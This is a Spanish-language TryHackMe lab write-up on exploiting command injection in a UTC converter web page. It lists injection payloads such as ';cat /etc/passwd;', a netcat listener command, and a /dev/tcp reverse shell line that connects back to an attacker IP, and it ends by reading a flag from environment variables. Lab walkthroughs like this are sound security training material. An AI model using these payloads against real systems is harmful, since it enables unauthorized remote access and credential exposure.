Bienvenidos a una sala mas de tryhackme, en esta ocasion abusaremos una pagina web utilizando comand injection, generaremos una reverse shell para tener un entorno mas comodo y obtendremos la flag enumerando las variables de entorno del desarrollador.

# Command Injection & Reverse Shell

Nos dirigimos a la pagina web donde podremos ver un convertidor UTC. Al escribir cualquier consulta, obtendremos como respuesta `exit status 1`, podremos utilizar comandos a eleccion, pero la respuesta va a ser la misma.

Para hacer uso de command injection en esta ocasion, tendremos que utilzar parametros para obtener una vista mas detallada del sistema y poder obtener informacion.
Tendremos muchos recursos para este caso, el siguiente enlace proporciona parametros que podremos utilizar para relizar esta tarea https://github.com/payloadbox/command-injection-payload-list.
Utilizo los siguientes parametros para enumerar un poco la maquina y saber como puedo obtener una reverse shell.

```ruby
;id;
;which bash;
;which python;
;cat /etc/passwd;
;ls;
|id
& whoami &
```
Sabemos que tiene bash alojado en /usr/bin/bash. Asique lo primero, nos pondremos en escucha en nuestra maquina atacante `nc -nvlp 4444` y procedemos a inyectar el siguiente parametro dentro de la pagina web `;sh -i >& /dev/tcp/10.8.2.121/4444 0>&1;`

Una vez obtenida nuetra shell, la pista en tryhackme nos dice que al desarrollador le gusta almacenar data en variables de entorno, por lo que listaremos las variables utilizando el comando #env y veremos alli nuestra flag.
 